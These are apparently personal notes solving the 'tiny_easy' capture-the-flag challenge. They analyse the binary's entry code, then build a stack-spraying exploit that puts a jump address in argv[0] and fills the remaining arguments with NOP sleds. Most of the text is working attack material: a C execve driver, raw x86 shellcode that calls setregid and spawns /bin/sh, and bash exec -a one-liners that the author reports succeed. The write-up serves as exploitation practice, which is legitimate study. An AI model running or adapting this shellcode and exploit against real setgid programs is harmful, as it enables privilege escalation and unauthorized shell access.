readelf -h tiny_easy
    after loading, entry at 0x08048054
    header is 52 bytes
    single program header starts at byte 52 (0x34), ends at byte 84 (0x54)
    -> this lines up with program entry point: the actual code is in bytes [84:]
    
pop eax
pop edx
mov edx, dword ptr [edx]
call edx

2nd item on the stack when program is loaded ends up in edx: call (*edx)()

-> idea: program is not linked against anything useful (or anything at all really), so we can't jump to something pre-existing
but we could inject shellcode as an argument and maybe jump to that
the 2nd item on the stack is the 'program_filename': can we change environment s.t. this program filename contains a jump to our injected shellcode (on the stack)?
    -> note stack is rwx, but still randomized location on program load

--- piece 1: shellcode
(in sh.asm)
man execve:
    If the set-user-ID bit is set on the program file referred to by
    pathname, then the effective user ID of the calling process is
    changed to that of the owner of the program file.  Similarly, if
    the set-group-ID bit is set on the program file, then the
    effective group ID of the calling process is set to the group of
    the program file.
    
    The effective user ID of the process is copied to the saved set-
    user-ID; similarly, the effective group ID is copied to the saved
    set-group-ID.  This copying takes place after any effective ID
    changes that occur because of the set-user-ID and set-group-ID
    mode bits.
    
    The process's real UID and real GID, as well as its supplementary
    group IDs, are unchanged by a call to execve().

since we're execve'ing into tiny_easy, our real/effective IDs are just tiny_easy
    -> saved gid should be tiny_easy_pwn
    -> getresgid() -> setregid()
    --> this isn't the case
        there's exceptions, e.g. if the filesystem has NOSUID flag -- which i think the /tmp/ filesystem does
        so, it might be easier to just inject payload (massive args list) into a file in /tmp/, and run ./tiny_easy < /tmp/args
        BUT, this runs into the issue of breaking piece 2 -- need to override program_filename argument (argv[0])

--- piece 2: inject custom "program_filename" onto stack
running with a custom environment: env -i TEST="TEST" bash -l -c "gdb tiny_easy"
    - not necessary though, can just pass payload through argv
running from a symlink DOES use the symlink's name
    maybe run a program which creates a virtual file symlinked to tiny_easy, and give virtual file name=payload?
    https://www.man7.org/linux/man-pages/man2/symlink.2.html
        - nope -- could create a symlink in /tmp directory with arbitrary name, but it will still have "/tmp" at the start
+++ overthinking it: execve() will do the trick just fine. argv[0] by CONVENTION is the filename, but we can just specify our own
    int main() {
        char* args[] = {"jmp_addr", "shellcode", NULL};
        execve("/home/tiny_easy/tiny_easy", args, NULL);
    }

--- piece 3: identifying location of shellcode on stack
... maybe since we're calling execve(), stack will remain in the location it is in our driver program?
* compile driver for x86: -m32
* disable relro: -Wl,-z,relro,-z,now
* disable stack canaries: -fno-stack-protector
* disable pie: -no-pie
* gcc -m32 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now te.c
    no: stack location always randomizes, not terribly surprising
    
"heap spraying": modify payload to include many, many copies of the shellcode, with massive NOP paddings

--------- this code works
--------- i thought it wouldn't, because of NOSUID issues with the /tmp/ file system
--------- but that turned out to not be the case, it works fine
--------- i was just using the wrong syscall in the shellcode (setreuid instead of setregid), silly mistake
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define N_COPIES 512
#define PACKAGE_SIZE 4096
int main() {
        int i, j, k, ec;
        char* args[N_COPIES];
        char* env[2];
        const char strpayload[] = "/bin/sh";
        const char shellcode[] = "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x47\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80";
        const char guess_addr[] = "\xc4\xa7\xac\xff";

        env[0] = "ENV=ENV";
        env[1] = NULL;

        printf("sizeof(shellcode) = %u | sizeof(guess_addr) = %u\n", sizeof(shellcode), sizeof(guess_addr));

        // argv[0]: jump address
        args[0] = (char*)(malloc(PACKAGE_SIZE));
        for (i = 0; i < sizeof(guess_addr); i++) args[0][i] = guess_addr[i];
        for (; i < PACKAGE_SIZE; i++) args[0][i] = '\x90';
        args[0][i] = '\x00';

        // argv[1]: string payload
        args[1] = (char*)(malloc(sizeof(strpayload)));
        for (i = 0; i < sizeof(strpayload); i++) args[1][i] = strpayload[i];

        // argv[2]: null string
        args[2] = (char*)(malloc(64));
        for (i = 0; i < 64; i++) args[2][i] = '\x00';

        // argv[3:N_COPIES - 2]: pass a package (NOPs + shellcode)
        for (i = 3; i < N_COPIES - 1; i++) {
                args[i] = (char*)(malloc(PACKAGE_SIZE));
                for (j = 0; j < (PACKAGE_SIZE - sizeof(shellcode)); j++) args[i][j] = '\x90';  // x86 NOP
                for (k = 0; k < sizeof(shellcode); j++, k++) args[i][j] = shellcode[k];
        }

        // argv[N_COPIES - 1]: nullptr
        args[i] = NULL;

        /*
           printf("args[1] = ... \n");
           for (i = 0; i < PACKAGE_SIZE; i += 32) {
           printf("0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx\n", args[1][i], args[1][i+1], args[1][i+2], args[1][i+3], args[1][i+4], args[1][i+5], args[1][i+6], args[1][i+7], args[1][i+8], args[1][i+9], args[1][i+10], args[1][i+11], args[1][i+12], args[1][i+13], args[1][i+14], args[1][i+15], args[1][i+16], args[1][i+17], args[1][i+18], args[1][i+19], args[1][i+20], args[1][i+21], args[1][i+22], args[1][i+23], args[1][i+24], args[1][i+25], args[1][i+26], args[1][i+27], args[1][i+28], args[1][i+29], args[1][i+30], args[1][i+31]);
           }
           */

        ec = execve("/home/tiny_easy/tiny_easy", args, env);
        if (ec) perror("execve error: ");
        return 0;
}
---------
---------
---------

https://lwn.net/Articles/630727/

some addresses where arg strings ended up:
ffcca7c4
ff85b7c4
ff9d27c4
ffb757c4
ffee27c4

------- 
------- alternate solution: directly from bash, no program required
-------
launching ./tiny_easy directly (well, using bash 'exec', with -a arg which allows us to override argv[0])

    * output args: programName, NOP sled, (test) shellcode. NOT using python print() outright because of issues with UTF-8 encoding
    * can debug by outputting to file and running in gdb with "run $(cat /tmp/argsfile)" to make sure args land accurately on stack

python3 -c 
    "import sys; 
    num_repeats = 4;
    nop_sled_len = 100;
    sys.stdout.buffer.write(
        b'/bin/sh ' 
        + (
            b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' 
            + b' '
        ) * num_repeats
    )"

python3 -c "import sys; num_repeats = 4; nop_sled_len = 100; sys.stdout.buffer.write(b'/bin/sh ' + ( b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' + b' ') * num_repeats)"

    * wrap it all in an exec -a
    * use jmp address as argv[0]
    * it works! (demo shellcode to write-syscall 16 bytes of argv[1], aka "/bin/sh"
( exec -a $(printf "\xc4\xa7\xca\xff") ./tiny_easy $(python3 -c "import sys; num_repeats = 200; nop_sled_len = 4060; sys.stdout.buffer.write(b'/bin/sh ' + ( b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' + b' ') * num_repeats)"))

    * real shellcode now...
\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x47\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80
( exec -a $(printf "\xc4\xa7\xca\xff") ./tiny_easy $(python3 -c "import sys; num_repeats = 200; nop_sled_len = 4060; sys.stdout.buffer.write(b'/bin/sh ' + ( b'\x90'*nop_sled_len + b'\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x47\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80' + b' ') * num_repeats)"))
